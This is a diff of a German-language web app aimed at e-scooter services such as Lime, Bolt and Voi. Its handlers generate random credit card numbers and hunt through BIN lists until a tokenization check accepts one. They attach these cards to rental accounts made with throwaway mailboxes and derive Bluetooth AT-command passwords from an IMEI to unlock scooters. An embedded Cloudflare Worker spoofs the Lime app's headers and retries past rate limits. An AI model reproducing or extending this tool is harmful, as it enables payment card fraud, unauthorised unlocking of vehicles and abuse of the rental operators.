+    stat("Guthaben " + money(r), "ok");
+    paint();
+  }, 60000);
+  $("bDrop").onclick = guard(kontoLoeschen);
+  $("bCode").onclick = guard(async () => {
+    if (!S.acct) return;
+    const r = await limeApi("/wallets", S.acct.t);
+    log(JSON.stringify(r.json || {}).slice(0, 300), "h");
+  }, 60000);
+  $("bPre").onclick = guard(vorflug, 90000);
+  $("bDef").onclick = guard(async () => {
+    if (!S.acct || !S.acct.card || !S.acct.card.id) throw new Error("keine hinterlegte Karte");
+    const ok = await alsStandard(S.acct.card.id);
+    if (ok){ stat("Standard gesetzt.", "ok"); await vorflug().catch(() => {}) }
+    else stat("Standard ließ sich nicht setzen.", "err");
+  }, 60000);
+  $("bRing").onclick = guard(async () => {
+    if (!S.qr) throw new Error("kein Code");
+    if (S.brand === "bolt" && S.boltBasic){
+      const g = await ort();
+      const srv = S.boltSrv || await boltSrv(g);
+      const d = await roh(srv + "/client/getVehicleDetails?vehicle_uuid=" + enc(S.qr) + "&deviceId=" + DEVTOK,
+        { headers: Object.assign({}, KOPF(), { Authorization: S.boltBasic }) });
+      const vid = d.json && d.json.data && d.json.data.vehicle && d.json.data.vehicle.id;
+      if (!vid) throw new Error("Roller unbekannt");
+      const r = await roh(srv + "/client/ringVehicle?deviceId=" + DEVTOK, {
+        method:"POST", headers: Object.assign({}, KOPF(), { Authorization: S.boltBasic }),
+        body:J({ vehicle_id: vid })
+      });
+      if (!r.ok) throw new Error("klingeln " + r.status);
+      stat("klingelt.", "ok");
+      return;
+    }
+    if (!S.acct) throw new Error("kein Konto");
+    const id = await limeId(S.qr);
+    const r = await limePost("/bikes/" + enc(id) + "/ring", HF(S.acct.t), F({ id:id }));
+    if (!r.ok) throw new Error("klingeln " + r.status + " " + saub(r.text));
+    stat("klingelt.", "ok");
+  }, 90000);
+
+  $("bNew2").onclick = () => {
+    if (S.prov) return;
+    S.card = newCard(); karteMerken(); cardPaint();
+    cstat("neue Karte · " + S.card.brand + " · " + S.card.name, "g");
+  };
+  $("bCopyNum").onclick = async () => {
+    if (!S.card) return;
+    try { await navigator.clipboard.writeText(S.card.num); cstat("Nummer kopiert.", "g") }
+    catch(_){ cstat("Kopieren verweigert.", "e") }
+  };
+  $("bCopyAll").onclick = async () => {
+    if (!S.card) return;
+    const t = "Name: " + S.card.name + "\nNummer: " + S.card.num +
+      "\nAblauf: " + S.card.mm + "/" + S.card.yy + "\nCVC: " + S.card.cvc;
+    try { await navigator.clipboard.writeText(t); cstat("alles kopiert.", "g") }
+    catch(_){ cstat("Kopieren verweigert.", "e") }
+  };
+  $("bTest").onclick = guard(async () => {
+    if (!S.card) throw new Error("erst würfeln");
+    const t = await tokenize(S.card);
+    const gut = t.pm || t.tok;
+    cstat(gut ? "Karte gültig · " + S.card.brand : "abgelehnt · " + (t.fehler || "?"), gut ? "g" : "e");
+  }, 60000);
+  $("bHunt").onclick = guard(async () => {
+    cstat("suche BIN …", "y");
+    for (const b of BIN_V.concat(BIN_M)){
+      const c = newCard(b);
+      const t = await tokenize(c);
+      const gut = t.pm || t.tok;
+      log("BIN " + b + " · " + (gut ? "gültig" : (t.fehler || "?")), gut ? "g" : "y");
+      if (gut){
+        S.card = c; S.bin = b; ls("bin", b); $("iBin").value = b;
+        karteMerken(); cardPaint(); paint();
+        cstat("BIN " + b + " passt.", "g");
+        return;
+      }
+    }
+    cstat("keine BIN passte.", "e");
+  }, 180000);
+  $("bUse").onclick = guard(async () => {
+    if (!S.acct) throw new Error("erst Konto");
+    if (!S.card) throw new Error("erst würfeln");
+    const t = await tokenize(S.card);
+    if (!t.pm && !t.tok) throw new Error("Karte abgelehnt · " + (t.fehler || "?"));
+    const h = await hinterlegen(S.card, t);
+    if (h.ok){
+      S.card.id = h.id;
+      S.acct.card = S.card;
+      const std = await alsStandard(h.id).catch(() => false);
+      if (std) S.acct.def = h.id;
+      saveAcc(); karteMerken();
+      cstat(std ? "hinterlegt und Standard." : "hinterlegt · Standard offen.", std ? "g" : "y");
+      await vorflug().catch(() => {});
+    } else cstat("nicht angenommen · " + (h.fehler || "?"), "e");
+    paint();
+  }, 90000);
+  $("bDel").onclick = guard(async () => {
+    if (!S.acct || !S.acct.card) return;
+    const id = S.acct.card.id;
+    if (id) await limeApi("/payment_methods/" + id, S.acct.t, { method:"DELETE" }).catch(() => {});
+    S.acct.card = null; S.acct.def = ""; saveAcc();
+    S.card = null; S.def = "";
+    ls("karte", null);
+    cstat("entfernt.", "ok"); paint();
+  }, 60000);
+  $("bTake").onclick = () => {
+    const n = $("iNum").value.replace(/\D/g, "");
+    const e = $("iExp").value.match(/(\d{2})\s*\/?\s*(\d{2})/);
+    if (n.length < 13 || !e){ cstat("Nummer/Exp unvollständig.", "e"); return }
+    const name = $("iName").value.trim() || "RIDER";
+    const teil = name.split(/\s+/);
+    S.card = { num:n, mm:e[1], yy:e[2], cvc:$("iCvc").value || "000",
+      name:name, vn:teil[0] || "", nn:teil.slice(1).join(" "),
+      brand:markeVon(n), rest:LIMIT, quelle:"echt" };
+    karteMerken(); cardPaint(); paint(); cstat("eigene Karte übernommen.", "g");
+  };
+
+  $("bRideStop").onclick = () => { fahrtStop(); stat("Fahrt gestoppt.", "ok") };
+  $("bRideReset").onclick = () => { fahrtReset(); stat("genullt.", "ok") };
+
+  $("bOwn").onclick = guard(async () => {
+    if (S.brand === "voi") throw new Error("Voi: in der Voi-App anmelden, Link hier einfügen");
+    const a = $("iOwn").value.trim();
+    if (!/@/.test(a)) throw new Error("Mail fehlt");
+    await limeMail(a);
+    stat("Mail angefordert · Link einfügen.", "ok");
+  }, 120000);
+  $("bLink").onclick = guard(async () => {
+    if (S.brand === "voi"){ await voiAnmelden(); return }
+    const t = grabToken($("iLink").value);
+    if (!t) throw new Error("kein Token im Link");
+    const tok = await limeLogin(t);
+    const a = { adr:$("iOwn").value.trim() || "eigene", dom:"eigen", t:tok, card:null, rest:0 };
+    S.konten[S.brand] = a; saveAcc(); S.acct = a;
+    stat("angemeldet.", "ok"); paint();
+  }, 120000);
+
+  $("bOtp").onclick = guard(otpSenden, 60000);
+  $("bOtp2").onclick = guard(otpPruefen, 60000);
+  $("bFachNeu").onclick = guard(async () => {
+    const b = await raceBox();
+    S.mail = b.adr;
+    log("Postfach bereit · " + b.adr + (b.pw !== "-" ? " · PW " + b.pw : ""), "g");
+    stat("Postfach bereit.", "ok");
+  }, 120000);
+
+  $("bPk").onclick = () => {
+    const v = $("iPk").value.trim();
+    if (!/^pk_(live|test)_/.test(v)){ stat("sieht nicht wie pk_… aus.", "warn"); return }
+    S.pk.lime = v; ls("pk", S.pk); stat("gespeichert.", "ok");
+  };
+  $("bBin").onclick = () => {
+    const v = $("iBin").value.replace(/\D/g, "");
+    if (v.length !== 6){ stat("BIN braucht 6 Ziffern.", "warn"); return }
+    S.bin = v; ls("bin", v); stat("BIN gesetzt.", "ok");
+  };
+  $("bSaveRelay").onclick = () => {
+    let v = $("iRelay").value.trim();
+    if (v && !/^https:\/\//.test(v)){ stat("muss mit https:// beginnen.", "warn"); return }
+    if (v && v.indexOf("?") < 0) v = v + "?url=";
+    S.relay = v; ls("relay", v); $("iRelay").value = v;
+    stat(v ? "Relay gespeichert." : "Relay leer.", "ok");
+  };
+  $("bRelayDel").onclick = () => { S.relay = ""; ls("relay", ""); $("iRelay").value = ""; stat("Relay gelöscht.", "ok") };
+  $("bFrei").onclick = () => { S.tot = {}; S.fehler = {}; S.bremse = 0; stat("Sperren aufgehoben.", "ok") };
+  $("bNet").onclick = guard(async () => {
+    stat("teste …", "warn");
+    for (const w of GETWEGE){
+      const t0 = Date.now();
+      try {
+        const r = await fetch(w.f("https://api.mail.tm/domains"), { cache:"no-store" });
+        log(w.n + " · " + r.status + " · " + (Date.now() - t0) + " ms", r.ok ? "g" : "y");
+      } catch(e){ log(w.n + " · " + kurz(e), "e") }
+    }
+    stat("Test beendet.", "ok");
+  }, 180000);
+  $("bCopyW").onclick = async () => {
+    try {
+      const r = await fetch("worker.js", { cache:"reload" });
+      await navigator.clipboard.writeText(await r.text());
+      stat("Worker-Code kopiert.", "ok");
+    } catch(_){
+      try { await navigator.clipboard.writeText($("workerCode").value); stat("kopiert.", "ok") } catch(__){}
+    }
+  };
+
+  $("bImei").onclick = () => {
+    const v = $("iImei").value.replace(/\D/g, "");
+    if (v.length !== 15){ $("pwAus").textContent = "IMEI braucht 15 Ziffern."; return }
+    $("pwAus").textContent = "Passwort: " + atPw(v);
+  };
+  $("bAuth").onclick = guard(async () => {
+    const v = $("iImei").value.replace(/\D/g, "");
+    if (v.length !== 15) throw new Error("IMEI fehlt");
+    await at("OKPWD", [atPw(v)]);
+  }, 60000);
+  $("bAt").onclick = guard(async () => {
+    await at("OKPWD", [$("iAt").value.trim() || OKAI_PW]);
+  }, 30000);
+  $("bRaw").onclick = guard(async () => {
+    const v = $("iRaw").value.trim();
+    if (!v) return;
+    const bytes = /^([0-9a-f]{2}[\s]?)+$/i.test(v)
+      ? Uint8Array.from(v.replace(/\s/g, "").match(/../g).map(h => parseInt(h, 16)))
+      : tb(/\r?\n$/.test(v) ? v : v + "\r\n");
+    log("> roh " + kurz(v), "h");
+    await push(bytes, true);
+  }, 30000);
+  $("bTestOk").onclick = guard(() => at("OKXWM", [OKAI_SVC_PW, "2"]), 30000);
+  $("bOkaiUn").onclick = guard(() => at("OKSCM", [OKAI_PW, "0"]), 30000);
+  $("bOkaiLk").onclick = guard(() => at("OKSCM", [OKAI_PW, "1"]), 30000);
+  $("bOkaiBat").onclick = guard(() => at("OKBCL", []), 30000);
+  $("bShot").onclick = guard(async () => {
+    for (const [op, f] of [["OKPWD", [OKAI_PW]], ["OKBCL", []], ["OKINF", []], ["OKMLK", []]]){
+      await at(op, f).catch(() => {});
+      await sleep(700);
+    }
+  }, 60000);
+
+  $("bCopy").onclick = async () => {
+    try { await navigator.clipboard.writeText($("log").innerText); stat("kopiert.", "ok") } catch(_){}
+  };
+  $("bClear").onclick = () => { $("log").innerHTML = "" };
+
+  $("bReset").onclick = guard(async () => {
+    stopCam(); stopHs(); stopKeep(); fahrtReset(); funkReset();
+    try { if (S.dev && S.dev.gatt.connected) S.dev.gatt.disconnect() } catch(_){}
+    try { Object.keys(localStorage).filter(k => k.startsWith("rk_")).forEach(k => localStorage.removeItem(k)) } catch(_){}
+    S.konten = { lime:null, voi:null, bolt:null };
+    S.pk = {}; S.block = []; S.acct = null; S.card = null; S.bin = ""; S.qr = "";
+    S.dev = null; S.chans = []; S.chan = null; S.tot = {}; S.fehler = {}; S.bremse = 0;
+    S.gut = ""; S.mail = ""; S.notes = 0; S.offen = false; S.lastUn = 0; S.torch = false; S.bal = 0;
+    S.def = ""; S.boltSrv = ""; S.boltBasic = ""; S.voiTok = ""; S.voiKarte = false; seqN = 0;
+    S.relay = RELAY_STD;
+    ["iPk","iBin","iPhone","iOtp","iNum","iExp","iCvc","iName","iOwn","iLink","iImei","iAt","iRaw","iPlate"]
+      .forEach(id => { $(id).value = "" });
+    $("iRelay").value = S.relay;
+    $("iFam").value = "";
+    $("log").innerHTML = ""; $("qrbox").textContent = ""; cstat(""); $("pwAus").textContent = "";
+    $("bt").textContent = "nicht verbunden";
+    $("bt").classList.remove("on");
+    $("punkt").classList.remove("on");
+    ["vDef","vStd","vWal","vBlock","vRate"].forEach(id => ampelSet(id, "–", ""));
+    kanalLeeren();
+    sig = ""; paint();
+    stat("zurückgesetzt.", "ok");
+  });
+
+  document.querySelectorAll(".brands button").forEach(b => {
+    b.onclick = () => { S.brand = b.dataset.b; sync(); stat("Marke " + S.brand.toUpperCase(), "ok") };
+  });
+
+  $("workerCode").value = WORKER;
+}
+
+const WORKER = `const KORB = "https://korb.rk/jar";
+const UA = "Lime/3.248.1 (iPhone; iOS 17.5; Scale/3.00)";
+
+async function korbLesen(){
+  const c = await caches.default.match(new Request(KORB));
+  return c ? (await c.text()) : "";
+}
+async function korbSchreiben(res){
+  let liste = [];
+  try { liste = res.headers.getSetCookie() } catch(_){}
+  if (!liste.length) return;
+  const alt = await korbLesen();
+  const map = {};
+  alt.split(";").forEach(p => { const i = p.indexOf("="); if (i > 0) map[p.slice(0,i).trim()] = p.slice(i+1).trim() });
+  liste.forEach(p => { const i = p.indexOf("="); if (i > 0) map[p.slice(0,i).trim()] = p.slice(i+1).trim() });
+  const neu = Object.keys(map).filter(k => map[k]).map(k => k + "=" + map[k]).join("; ");
+  await caches.default.put(new Request(KORB), new Response(neu, {
+    headers: { "content-type":"text/plain", "cache-control":"max-age=3600" }
+  }));
+}
+
+async function sitzung(){
+  for (const z of [
+    "https://web-production.lime.bike/api/rider/v2/onboarding/session",
+    "https://lime.bike/"
+  ]){
+    try {
+      const r = await fetch(z, { headers: {
+        "accept":"application/json, text/plain, */*",
+        "accept-language":"de-DE,de;q=0.9",
+        "user-agent":UA,
+        "origin":"https://web-production.lime.bike",
+        "referer":"https://web-production.lime.bike/"
+      }, redirect:"follow" });
+      await korbSchreiben(r);
+      const k = await korbLesen();
+      if (k && /session/i.test(k)) return k;
+    } catch(_){}
+  }
+  return "";
+}
+
+const WEG = ["host","cf-connecting-ip","cf-ray","cf-visitor","x-forwarded-proto",
+  "origin","referer","accept-encoding","content-length","cookie","user-agent"];
+
+export default {
+  async fetch(req){
+    const cors = {
+      "access-control-allow-origin":"*",
+      "access-control-allow-headers":"*",
+      "access-control-allow-methods":"GET,POST,PUT,PATCH,DELETE,OPTIONS",
+      "access-control-max-age":"86400",
+      "access-control-expose-headers":"retry-after,x-rk-session,x-rk-try"
+    };
+    if (req.method === "OPTIONS") return new Response(null, { status:204, headers:cors });
+
+    const u = new URL(req.url);
+    const ziel = u.searchParams.get("url");
+    if (!ziel) return new Response(JSON.stringify({ fehler:"url fehlt" }),
+      { status:400, headers:{ ...cors, "content-type":"application/json" } });
+
+    let t;
+    try { t = new URL(ziel) } catch(_){
+      return new Response(JSON.stringify({ fehler:"url kaputt" }),
+        { status:400, headers:{ ...cors, "content-type":"application/json" } });
+    }
+
+    const lime = /(^|\\.)lime\\.bike$/.test(t.hostname);
+    const meth = req.method;
+    const roh = meth === "HEAD" ? null : await req.arrayBuffer();
+    const koerper = (roh && roh.byteLength) ? roh : undefined;
+
+    const kopf = {};
+    req.headers.forEach((v,k) => { if (WEG.indexOf(k) < 0) kopf[k] = v });
+    kopf["user-agent"] = UA;
+
+    if (lime){
+      kopf["origin"] = "https://web-production.lime.bike";
+      kopf["referer"] = "https://web-production.lime.bike/";
+      kopf["accept-language"] = "de-DE,de;q=0.9";
+      kopf["platform"] = "iOS";
+      kopf["app-version"] = "3.248.1";
+      let jar = await korbLesen();
+      if (!jar) jar = await sitzung();
+      if (jar) kopf["cookie"] = jar;
+    }
+
+    let versuche = 0, res;
+    while (versuche < 3){
+      versuche++;
+      try {
+        res = await fetch(t.toString(), { method:meth, headers:kopf, body:koerper, redirect:"follow" });
+      } catch(e){
+        res = new Response(JSON.stringify({ fehler:"upstream", detail:String(e) }),
+          { status:502, headers:{ "content-type":"application/json" } });
+      }
+      if (lime) await korbSchreiben(res);
+      if (!lime) break;
+      if (res.status !== 429 && res.status !== 503 && res.status !== 521) break;
+      if (versuche >= 3) break;
+      const ra = parseInt(res.headers.get("retry-after") || "0", 10);
+      await new Promise(r => setTimeout(r, ra > 0 ? Math.min(ra, 25) * 1000 : 2500 * versuche));
+      const neu = await korbLesen();
+      if (neu) kopf["cookie"] = neu;
+    }
+
+    const raus = new Headers(res.headers);
+    ["content-encoding","content-length","transfer-encoding","set-cookie","cache-control"].forEach(k => raus.delete(k));
+    for (const k in cors) raus.set(k, cors[k]);
+    raus.set("cache-control", "no-store");
+    raus.set("x-rk-session", lime ? ((await korbLesen()) ? "1" : "0") : "-");
+    raus.set("x-rk-try", String(versuche));
+    return new Response(res.body, { status:res.status, headers:raus });
+  }
+};`;
+
+boot();
+
+if ("serviceWorker" in navigator) navigator.serviceWorker.register("./sw.js").catch(() => {});
+</script>
+</body>
+</html>
